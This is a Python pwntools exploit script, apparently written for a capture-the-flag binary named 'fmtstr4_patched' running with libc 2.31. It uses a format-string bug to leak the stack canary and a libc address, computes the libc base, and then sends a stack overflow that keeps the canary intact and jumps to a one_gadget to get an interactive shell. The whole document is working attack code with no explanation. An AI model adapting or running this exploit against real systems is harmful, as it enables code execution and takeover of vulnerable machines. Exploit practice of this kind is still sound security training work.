from pwn import *
exe = ELF("./fmtstr4_patched")
libc = ELF("./libc-2.31.so")
p = process(exe.path)
gdb.attach(p, gdbscript = '''

b*main+354
c
           ''')
input()

payload = b'01234456789 %21$p %23$p'
p.sendafter(b"ID: ", payload)
p.sendafter(b'Password: ', b'&WPAbC&M!%8S5X#W')
p.recvuntil(b"01234456789 ")

canary = int(p.recv(18), 16)
leak_libc = int(p.recvuntil(b"Enter", drop = True)[1:], 16)
libc.address = leak_libc - 0x24083
log.info('canary: ' + hex(canary))
log.info('leak libc: ' + hex(leak_libc))
log.info('base: ' + hex(libc.address))
log.info('system ' + hex(libc.sym['system']))

one_gadget = libc.address + 0xe3b01
payload2 = b'a' * 56 + p64(canary) + b'b' *8
payload2 +=  p64(one_gadget)
p.sendafter(b"your secret: ", payload2)
p.interactive()